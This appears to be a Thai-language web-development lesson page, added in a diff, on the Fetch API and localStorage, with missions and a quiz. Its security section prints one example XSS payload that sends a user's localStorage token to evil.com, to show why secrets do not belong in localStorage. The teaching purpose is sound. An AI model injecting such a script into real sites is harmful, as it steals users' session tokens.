@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>บทที่ 2: Fetch API + LocalStorage</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<header class="hero">
+  <div class="wrap">
+    <div class="crumb"><a href="index.html" style="color:#fff">Week 1</a> · บทที่ 2</div>
+    <h1>Fetch API + LocalStorage</h1>
+    <p>ดึงข้อมูลจากโลกภายนอก และจำข้อมูลไว้ไม่ให้หาย — สอนในมุมมองของคนที่เคยเป็น Pentester</p>
+  </div>
+</header>
+<div class="wrap">
+
+  <div class="card">
+    <h3 style="margin-top:0">🎯 จบบทนี้คุณจะ...</h3>
+    <ul class="check">
+      <li>เขียน fetch pattern มาตรฐานที่มี loading / error / finally ครบแบบ production</li>
+      <li>รู้กับดัก <code>res.ok</code> ที่ 90% ของมือใหม่ไม่รู้</li>
+      <li>ใช้ LocalStorage ถูกวิธี และอธิบายได้ว่า "อะไรห้ามเก็บ เพราะอะไร" (XSS)</li>
+    </ul>
+  </div>
+
+  <!-- ===================== คีย์เวิร์ดภาพจำ ===================== -->
+  <div class="card">
+    <h3 style="margin-top:0">🔑 คีย์เวิร์ดภาพจำประจำบท</h3>
+    <div class="kw-row">
+      <span class="kw">📦 พนักงานส่งของ 2 จังหวะ = fetch แล้ว .json()</span>
+      <span class="kw">⚠️ กล่องมาถึงแต่ข้างในคือข่าวร้าย = 404/500 ไม่เข้า catch</span>
+      <span class="kw">🚪 เช็คหน้ากล่องก่อนแกะ = res.ok</span>
+      <span class="kw">🗄 ตู้เก็บของที่ใครในห้องก็เปิดได้ = localStorage</span>
+      <span class="kw">🕵️ script แปลกปลอมในห้อง = XSS</span>
+      <span class="kw">🔒 ตู้เซฟที่ JS เปิดไม่ได้ = HttpOnly cookie</span>
+    </div>
+  </div>
+
+  <!-- ===================== ภาพประกอบหลัก ===================== -->
+  <figure class="figure">
+    <svg viewBox="0 0 700 210" xmlns="http://www.w3.org/2000/svg" font-family="Sarabun,sans-serif">
+      <rect x="20" y="60" width="150" height="90" rx="10" fill="#2563eb"/>
+      <text x="95" y="98" font-size="14" fill="#fff" text-anchor="middle" font-weight="700">🖥 Browser</text>
+      <text x="95" y="118" font-size="11" fill="#fff" text-anchor="middle">(เว็บของเรา)</text>
+      <rect x="530" y="60" width="150" height="90" rx="10" fill="#1f2937"/>
+      <text x="605" y="98" font-size="14" fill="#fff" text-anchor="middle" font-weight="700">☁️ Server / API</text>
+      <text x="605" y="118" font-size="11" fill="#fff" text-anchor="middle">(pokeapi, GA4, ฯลฯ)</text>
+      <path d="M 175 85 L 525 85" stroke="#2563eb" stroke-width="2.5" marker-end="url(#b2)"/>
+      <text x="350" y="76" font-size="12" fill="#1e40af" text-anchor="middle" font-weight="600">① await fetch(url) — ส่ง Request ออกไป</text>
+      <path d="M 525 125 L 175 125" stroke="#059669" stroke-width="2.5" marker-end="url(#g2)"/>
+      <text x="350" y="148" font-size="12" fill="#047857" text-anchor="middle" font-weight="600">② Response กลับมา (กล่องพัสดุ) → เช็ค res.ok → ③ await res.json() แกะกล่อง</text>
+      <text x="350" y="185" font-size="12" fill="#dc2626" text-anchor="middle" font-weight="600">⚠️ ถ้าเน็ตล่ม = ไม่มีกล่องกลับมา → เข้า catch | ถ้า 404/500 = มีกล่อง แต่ข้างในคือข่าวร้าย → ต้องเช็คเอง</text>
+      <defs>
+        <marker id="b2" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#2563eb"/></marker>
+        <marker id="g2" markerWidth="8" markerHeight="8" refX="6" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#059669"/></marker>
+      </defs>
+    </svg>
+    <figcaption>ภาพที่ 1: วงจร fetch — ขาไป (Request) / ขากลับ (Response) และจุดที่พังได้ 2 แบบซึ่งต้องจัดการต่างกัน</figcaption>
+  </figure>
+
+  <!-- ===================== แนวคิด Dev ===================== -->
+  <h2>🧠 แนวคิด & หลักการของ Dev ประจำบทนี้</h2>
+  <div class="card">
+    <h3>หลักการ 1: "Never trust the network" (เครือข่ายพังได้เสมอ — ออกแบบเผื่อไว้)</h3>
+    <p>ทุกครั้งที่ข้อมูลข้ามเครื่อง อะไรก็พังได้: เน็ตหลุด, server ล่ม, ตอบช้า 30 วิ, ตอบมาแต่ format ผิด
+    Dev มืออาชีพจึงเขียน UI ครบ <strong>4 สถานะเสมอ</strong>: Loading / Success / Error / Empty
+    — มือใหม่เขียนแค่ Success สถานะเดียว แล้วเว็บก็ "ค้างเงียบ ๆ" เมื่อโลกจริงไม่เป็นใจ
+    (นี่คือเหตุผลที่ Mission บังคับเทสต์แบบปิด WiFi)</p>
+    <h3>หลักการ 2: "Single source of truth" (ความจริงต้องมีที่เก็บเดียว)</h3>
+    <p>ใน Mission Favorites — ข้อมูลจริงอยู่ใน localStorage <strong>ที่เดียว</strong>
+    หน้าจอเป็นแค่ "ภาพสะท้อน" ของมัน ทุกการแก้ไขทำที่ storage แล้ว render ใหม่จากต้นทางเสมอ
+    ไม่แก้หน้าจอตรง ๆ แยกจาก storage (เพราะเดี๋ยวสองที่ไม่ตรงกัน = บั๊กคลาสสิก)
+    หลักการนี้คือรากของ React state ที่จะเจอใน Week 8 — เรียนตอนนี้ = ได้เปรียบตอนนั้น</p>
+    <h3>หลักการ 3: "Defense in depth" (ป้องกันหลายชั้น — มุม pentester)</h3>
+    <p>อย่าฝากความปลอดภัยไว้กับชั้นเดียว: เช็ค <code>res.ok</code> (ชั้น 1) + try/catch (ชั้น 2)
+    + ไม่เก็บของลับใน localStorage (ชั้น 3) + validate ข้อมูลก่อนใช้ (ชั้น 4)
+    แต่ละชั้นกันคนละเรื่อง พังชั้นหนึ่งยังเหลือชั้นอื่น — หลักเดียวกับที่คุณใช้ตอน pentest
+    แค่ตอนนี้อยู่ฝั่งสร้างกำแพงแทนฝั่งปีน</p>
+    <div class="tip"><strong>เมื่อไหร่ใช้ / ไม่ใช้ localStorage:</strong> ใช้กับ preference และ cache ที่ไม่ลับ
+    / ไม่ใช้กับข้อมูลที่ต้อง sync ข้ามเครื่อง (ต้องใช้ database — Week 4) และห้ามใช้กับความลับทุกชนิด</div>
+  </div>
+
+  <!-- ===================== ส่วนที่ 1 ===================== -->
+  <h2>ส่วนที่ 1: Fetch API คืออะไร ทำงานยังไง</h2>
+
+  <div class="step"><div class="num">1</div><div>
+    <h3 style="margin-top:0">ภาพรวม: พนักงานส่งของระหว่างเว็บเรากับ Server</h3>
+    <p><code>fetch()</code> คือคำสั่งส่ง HTTP Request ออกไปขอข้อมูลจาก Server แล้วรอรับ Response กลับมา
+    เพราะข้อมูลต้องเดินทางผ่านอินเทอร์เน็ต (กินเวลาไม่แน่นอน) — fetch จึงเป็น async เสมอ
+    และนี่คือเหตุผลที่ต้องเรียนบทที่ 1 ก่อน</p>
+    <p>ขั้นตอนมี 2 จังหวะที่ต้องรอ:</p>
+<pre><code>const res  = await fetch(url);   // จังหวะ 1: รอ "กล่องพัสดุ" (Response) มาถึง
+const data = await res.json();   // จังหวะ 2: รอ "แกะกล่อง" แปลงเนื้อในเป็น Object</code></pre>
+    <p>ทำไมแกะกล่องต้องรอด้วย? เพราะข้อมูลอาจใหญ่มาก (หลาย MB) browser ทยอยอ่านเป็น stream
+    การแปลงทั้งก้อนเป็น JSON จึงเป็นงานที่ใช้เวลาเช่นกัน</p>
+  </div></div>
+
+  <div class="step"><div class="num">2</div><div>
+    <h3 style="margin-top:0">กับดักใหญ่: fetch ไม่ถือว่า 404/500 เป็น error!</h3>
+    <p>นี่คือจุดที่มือใหม่ (และมือกลางจำนวนมาก) พลาด:
+    <code>fetch</code> จะ throw เข้า catch <strong>เฉพาะตอน network ล่ม</strong> (เน็ตหลุด, DNS ไม่เจอ, CORS block)
+    แต่ถ้า Server ตอบกลับมาว่า 404 Not Found หรือ 500 Internal Error — fetch ถือว่า "ส่งของสำเร็จ"
+    เพราะมี response กลับมาจริง ๆ แค่เนื้อในเป็นข่าวร้าย</p>
+<pre><code>// ❌ โค้ดนี้จะไม่เข้า catch แม้ server ตอบ 500
+try {
+  const res = await fetch("/api/broken");
+  const data = await res.json();   // อาจพังตรงนี้แทน หรือได้ data ขยะ
+} catch (err) { ... }
+
+// ✅ ต้องเช็ค res.ok เองเสมอ (ok = status 200-299)
+try {
+  const res = await fetch("/api/broken");
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);  // ← บรรทัดสำคัญที่สุดของบทนี้
+  const data = await res.json();
+} catch (err) { ... }</code></pre>
+    <table>
+      <tr><th>สถานการณ์</th><th>เข้า catch ไหม?</th><th>วิธีจัดการ</th></tr>
+      <tr><td>เน็ตหลุด / server ดับ</td><td>✅ เข้า</td><td>catch จัดการเอง</td></tr>
+      <tr><td>Server ตอบ 404 / 500</td><td>❌ ไม่เข้า</td><td>ต้องเช็ค <code>res.ok</code> แล้ว throw เอง</td></tr>
+      <tr><td>ตอบ 200 แต่ body ไม่ใช่ JSON</td><td>✅ เข้า (พังตอน .json())</td><td>catch จัดการเอง</td></tr>
+    </table>
+  </div></div>
+
+  <div class="step"><div class="num">3</div><div>
+    <h3 style="margin-top:0">Pattern มาตรฐาน 7 ขั้น (ใช้ได้ตลอดชีวิต dev)</h3>
+<pre><code>const loadData = async () => {
+  showLoading();                                        // 1. บอกผู้ใช้ว่ากำลังทำงาน
+  try {
+    const res = await fetch(url);                       // 2. รอ response
+    if (!res.ok) throw new Error(`HTTP ${res.status}`); // 3. เช็คสถานะก่อนเสมอ
+    const data = await res.json();                      // 4. แกะ JSON
+    render(data);                                       // 5. สำเร็จ → วาดหน้าจอ
+  } catch (err) {
+    showError(err.message);                             // 6. พัง → บอกผู้ใช้ดี ๆ
+  } finally {
+    hideLoading();                                      // 7. ปิด loading ทุกกรณี
+  }
+};</code></pre>
+    <div class="tip"><strong>ทำไมต้อง <code>finally</code>?</strong> ถ้าปิด loading ไว้ใน try อย่างเดียว
+    เวลา error จะลืมปิด → ผู้ใช้เห็น "กำลังโหลด..." ค้างตลอดกาล
+    finally ทำงาน<strong>ทุกกรณี</strong>ไม่ว่าสำเร็จหรือพัง — เหมาะกับงาน "เก็บกวาด" แบบนี้ที่สุด</div>
+  </div></div>
+
+  <!-- ===================== ส่วนที่ 2 ===================== -->
+  <h2>ส่วนที่ 2: LocalStorage — ความจำของ Browser</h2>
+
+  <div class="step"><div class="num">1</div><div>
+    <h3 style="margin-top:0">ปัญหา: ตัวแปร JS ตายทุกครั้งที่ refresh</h3>
+    <p>ทุกตัวแปรที่คุณสร้าง (<code>let cart = [...]</code>) อยู่ใน RAM ของแท็บนั้น
+    กด refresh ปุ๊บ — หายเกลี้ยง LocalStorage คือ "ตู้เก็บของถาวร" ของ browser
+    ที่อยู่รอดข้าม refresh, ปิดเครื่อง, เปิดใหม่</p>
+  </div></div>
+
+  <div class="step"><div class="num">2</div><div>
+    <h3 style="margin-top:0">คำสั่งมีแค่ 4 ตัว แต่มีกฎเหล็ก 1 ข้อ</h3>
+<pre><code>localStorage.setItem("key", value);   // เก็บ
+localStorage.getItem("key");          // อ่าน (ไม่มี → ได้ null)
+localStorage.removeItem("key");       // ลบทีละตัว
+localStorage.clear();                 // ล้างหมดทั้งเว็บ (ระวัง!)</code></pre>
+    <div class="warn"><strong>กฎเหล็ก: เก็บได้แค่ String เท่านั้น</strong> —
+    ถ้ายัด Array/Object เข้าไปตรง ๆ มันจะถูกแปลงเป็น <code>"[object Object]"</code> แบบใช้งานไม่ได้
+    ต้องแปลงไปกลับเสมอ:</div>
+<pre><code>// เก็บ: Object → String
+localStorage.setItem("cart", JSON.stringify(cart));
+
+// อ่าน: String → Object (พร้อมกันค่า null ครั้งแรก)
+const cart = JSON.parse(localStorage.getItem("cart")) ?? [];</code></pre>
+    <p>เครื่องหมาย <code>??</code> (Nullish Coalescing) แปลว่า "ถ้าข้างหน้าเป็น null/undefined ให้ใช้ค่าข้างหลังแทน"
+    — ใช้กันเคสเปิดเว็บครั้งแรกที่ยังไม่เคยเก็บอะไร</p>
+  </div></div>
+
+  <div class="step"><div class="num">3</div><div>
+    <h3 style="margin-top:0">🔐 มุม Security: อะไรห้ามเก็บ และทำไม (จุดขายของคุณ)</h3>
+    <figure class="figure">
+      <svg viewBox="0 0 700 170" xmlns="http://www.w3.org/2000/svg" font-family="Sarabun,sans-serif">
+        <rect x="20" y="20" width="320" height="130" rx="10" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
+        <text x="180" y="45" font-size="13" font-weight="700" fill="#dc2626" text-anchor="middle">🗄 localStorage = ตู้เปิดโล่งกลางห้อง</text>
+        <rect x="45" y="60" width="120" height="34" rx="6" fill="#2563eb"/>
+        <text x="105" y="82" font-size="11" fill="#fff" text-anchor="middle">โค้ดของเรา ✅ อ่านได้</text>
+        <rect x="185" y="60" width="130" height="34" rx="6" fill="#dc2626"/>
+        <text x="250" y="82" font-size="11" fill="#fff" text-anchor="middle">🕵️ script XSS ก็อ่านได้!</text>
+        <text x="180" y="125" font-size="11" fill="#991b1b" text-anchor="middle">JS ทุกบรรทัดในหน้า เปิดตู้นี้ได้หมด</text>
+        <rect x="370" y="20" width="310" height="130" rx="10" fill="#ecfdf5" stroke="#059669" stroke-width="2"/>
+        <text x="525" y="45" font-size="13" font-weight="700" fill="#047857" text-anchor="middle">🔒 HttpOnly Cookie = ตู้เซฟฝังผนัง</text>
+        <rect x="395" y="60" width="120" height="34" rx="6" fill="#6b7280"/>
+        <text x="455" y="82" font-size="11" fill="#fff" text-anchor="middle">โค้ดเรา ❌ อ่านไม่ได้</text>
+        <rect x="535" y="60" width="120" height="34" rx="6" fill="#6b7280"/>
+        <text x="595" y="82" font-size="11" fill="#fff" text-anchor="middle">XSS ❌ อ่านไม่ได้</text>
+        <text x="525" y="125" font-size="11" fill="#047857" text-anchor="middle">Browser แนบให้ Server เองอัตโนมัติ</text>
+      </svg>
+      <figcaption>ภาพที่ 2: ทำไม token ไม่ควรอยู่ localStorage — ตู้เปิดโล่ง vs ตู้เซฟที่ JS แตะไม่ได้</figcaption>
+    </figure>
+    <p>localStorage อ่านได้ด้วย JavaScript <strong>ทุกบรรทัดที่รันในหน้านั้น</strong>
+    — รวมถึง script ของคนร้ายที่ฝังเข้ามาผ่านช่องโหว่ <strong>XSS (Cross-Site Scripting)</strong></p>
+    <p>ลองคิดแบบ pentester (ซึ่งคุณเคยเป็น): ถ้าเว็บมีจุดที่แสดง input ของผู้ใช้โดยไม่ escape
+    ผมฝัง <code>&lt;script&gt;fetch('https://evil.com?steal=' + localStorage.getItem('token'))&lt;/script&gt;</code>
+    ลงใน comment ได้ — token ของ<strong>ทุกคนที่เปิดหน้านั้น</strong>ไหลมาที่ผมทันที</p>
+    <table>
+      <tr><th>ข้อมูล</th><th>เก็บใน localStorage ได้ไหม</th><th>เหตุผล</th></tr>
+      <tr><td>ธีม Dark mode, ภาษา</td><td>✅ ได้</td><td>รั่วไปก็ไม่มีใครเดือดร้อน</td></tr>
+      <tr><td>ตะกร้าสินค้า (ยังไม่จ่าย)</td><td>✅ ได้</td><td>ข้อมูลไม่ลับ</td></tr>
+      <tr><td>Password</td><td>🚫 ห้ามเด็ดขาด</td><td>XSS เดียวจบ</td></tr>
+      <tr><td>Access token อายุยาว</td><td>🚫 ไม่ควร</td><td>ระบบจริงใช้ <strong>HttpOnly Cookie</strong> ซึ่ง JS อ่านไม่ได้ → XSS ขโมยไม่ได้</td></tr>
+    </table>
+    <p>หัวข้อ "token ควรอยู่ไหน" จะกลับมาอีกครั้งตอน Kcode Day 5 (JWT) —
+    ตอนนั้นผมจะถามคุณว่าคอร์สสอนเก็บไว้ที่ไหน และคุณเห็นด้วยไหมในมุม security</p>
+  </div></div>
+
+  <!-- ===================== ส่วนที่ 3 ===================== -->
+  <h2>ส่วนที่ 3: ตัวอย่างการประยุกต์ในงานจริง</h2>
+
+  <div class="card">
+    <h3 style="margin-top:0">🏢 กรณีที่ 1: เว็บ welovefukushima ของคุณ</h3>
+    <p>AJAX filter ใน <code>inc/ajax.php</code> ของคุณ ฝั่ง JS ที่เรียกมันคือ fetch pattern นี้เป๊ะ:
+    ผู้ใช้เลือกหมวดสถานที่เที่ยว → fetch ไปที่ admin-ajax → แสดงผลโดยไม่ reload หน้า
+    ถ้าเพิ่ม <code>res.ok</code> check + loading state + ปุ่ม disabled กันกดรัว
+    เว็บลูกค้าคุณจะ robust ขึ้นทันที — <strong>ลองกลับไปดูโค้ดตัวเองหลังจบบทนี้</strong></p>
+  </div>
+
+  <div class="card">
+    <h3 style="margin-top:0">📊 กรณีที่ 2: Dashboard การตลาดที่ media-presto</h3>
+    <p>ถ้าทำหน้า dashboard ให้ลูกค้าดูสถิติ: ตัวเลือก filter (ช่วงเวลา, แพลตฟอร์ม) ที่ลูกค้าเลือกไว้
+    ควรเก็บใน localStorage → ลูกค้าเปิดมาใหม่พรุ่งนี้ filter เดิมยังอยู่ = UX ดีขึ้นแบบฟรี ๆ
+    ส่วน token สำหรับเรียก GA4 API <strong>ห้าม</strong>อยู่ฝั่ง browser เด็ดขาด — ต้องอยู่ฝั่ง server เท่านั้น
+    (หลักการนี้คือเหตุผลที่ Kcode Day 7 สอนทำ "API Proxy")</p>
+  </div>
+
+  <!-- ===================== Mission ===================== -->
+  <h2>ภารกิจ (เขียนเองทั้งหมด)</h2>
+
+  <div class="mission">
+    <h3>🎯 Mission 2.1: Pokedex มินิ <span class="badge orange">30 นาที</span></h3>
+    <p>สร้าง <code>practice/pokedex.html</code> หน้าเดียวจบ (HTML + JS ในไฟล์เดียว ใช้ Bootstrap CDN ได้):</p>
+    <ol>
+      <li>ช่อง input + ปุ่มค้นหา → fetch <code>https://pokeapi.co/api/v2/pokemon/{ชื่อ}</code></li>
+      <li>เจอ → แสดงชื่อ + รูป (<code>data.sprites.front_default</code>) + น้ำหนัก</li>
+      <li>ไม่เจอ (API ตอบ 404) → ข้อความสีแดง "ไม่พบโปเกมอน" — <em>ข้อนี้บังคับใช้ความรู้ res.ok</em></li>
+      <li>ระหว่างโหลด → ข้อความ "กำลังค้นหา..." และ<strong>ปุ่มต้อง disabled</strong> (กันผู้ใช้กดรัวยิง API ซ้ำ)
+        <br><em>ใบ้: <code>btn.disabled = true</code> ก่อน fetch, คืนค่าใน finally</em></li>
+    </ol>
+    <p>ทดสอบด้วย: <code>pikachu</code> (เจอ), <code>asdfgh</code> (404), ปิด WiFi แล้วค้นหา (network error)</p>
+  </div>
+
+  <div class="mission">
+    <h3>🎯 Mission 2.2: ระบบ Favorites <span class="badge orange">20 นาที</span></h3>
+    <p>ต่อจาก Pokedex เดิม:</p>
+    <ol>
+      <li>ปุ่ม "เก็บเข้ากระเป๋า" → เพิ่มชื่อลง array ใน localStorage (<strong>เช็คชื่อซ้ำก่อน push</strong>)</li>
+      <li>แสดงรายการที่เก็บไว้ใต้หน้า + โหลดอัตโนมัติตอนเปิดเว็บ</li>
+      <li>ปุ่ม "ล้างกระเป๋า" พร้อม <code>confirm()</code> ถามก่อนลบ</li>
+    </ol>
+    <p>เทสต์สุดท้าย: เก็บ 3 ตัว → refresh → ต้องอยู่ครบ 3</p>
+  </div>
+
+  <!-- ===================== Quiz ===================== -->
+  <h2>📝 Quiz ท้ายบท</h2>
+  <p>ตอบเองก่อนเปิดเฉลย แล้วส่งคำตอบใน chat</p>
+
+  <details><summary>ข้อ 1: ทำไม fetch ที่ได้ HTTP 500 ถึงไม่เข้า catch (ถ้าไม่เช็ค res.ok) แต่ network ล่มถึงเข้า?</summary>
+    <p>เพราะในมุมของ fetch "หน้าที่ของฉันคือส่ง request และเอา response กลับมา" —
+    500 ก็คือ response ที่ส่งสำเร็จ (มีของกลับมา แค่ข้างในเป็นข่าวร้าย) จึงถือว่างานสำเร็จ
+    ส่วน network ล่ม = ไม่มี response เลย = ทำหน้าที่ไม่สำเร็จ → throw
+    ดังนั้น dev ต้องเช็คความหมายทางธุรกิจของ status เอง ผ่าน <code>res.ok</code> / <code>res.status</code></p></details>
+
+  <details><summary>ข้อ 2: ในมุม pentester — อธิบายการโจมตีที่ทำให้ token ใน localStorage รั่ว และทำไม HttpOnly cookie ป้องกันได้</summary>
+    <p>การโจมตีคือ <strong>XSS</strong>: ถ้าเว็บแสดงข้อมูลที่ผู้ใช้กรอกโดยไม่ sanitize/escape
+    คนร้ายฝัง script ลงในหน้าได้ และ script นั้นอ่าน <code>localStorage.getItem("token")</code>
+    แล้วส่งออกไป server ตัวเองได้ทันที เพราะ localStorage เปิดให้ JS ทุกบรรทัดอ่านได้
+    ส่วน <strong>HttpOnly cookie</strong> คือ cookie ที่ browser ห้าม JavaScript อ่าน (<code>document.cookie</code> มองไม่เห็น)
+    มันถูกแนบไปกับ request โดย browser เอง — ต่อให้โดน XSS ก็อ่าน token ตรง ๆ ไม่ได้</p></details>
+
+  <details><summary>ข้อ 3: <code>??</code> ใน <code>JSON.parse(localStorage.getItem("x")) ?? []</code> ทำหน้าที่อะไร ต่างจาก <code>||</code> ยังไง?</summary>
+    <p><code>??</code> คืนค่าขวาเฉพาะเมื่อซ้ายเป็น <code>null</code> หรือ <code>undefined</code>
+    ส่วน <code>||</code> คืนค่าขวาเมื่อซ้ายเป็น falsy <strong>ทุกชนิด</strong> (รวม <code>0</code>, <code>""</code>, <code>false</code>)
+    เคสนี้ใช้ <code>??</code> ปลอดภัยกว่า เช่น ถ้าเก็บค่า <code>0</code> ไว้จริง ๆ
+    <code>|| []</code> จะเหมาเอาว่าไม่มีข้อมูลแล้วทับด้วย array เปล่า — บั๊กเงียบที่หายากมาก</p></details>
+
+  <h2>✅ Checkpoint</h2>
+  <ul class="check">
+    <li>Pokedex ผ่านเทสต์ครบ 3 แบบ (เจอ / 404 / network error)</li>
+    <li>ปุ่ม disabled ระหว่างโหลด ทำงานจริง</li>
+    <li>Favorites รอด refresh</li>
+    <li>Quiz ส่งใน chat + จดโน้ต <code>notes/fetch-localstorage.md</code></li>
+  </ul>
+
+  <div class="nav-bottom">
+    <a class="btn ghost" href="01-async-await.html">← บทที่ 1</a>
+    <a class="btn" href="03-mission-reading-list.html">Mission ใหญ่: Reading List →</a>
+  </div>
+  <footer>คอร์ส Senior Secure Full Stack · Week 1 บทที่ 2</footer>
+</div>
+</body>
+</html>
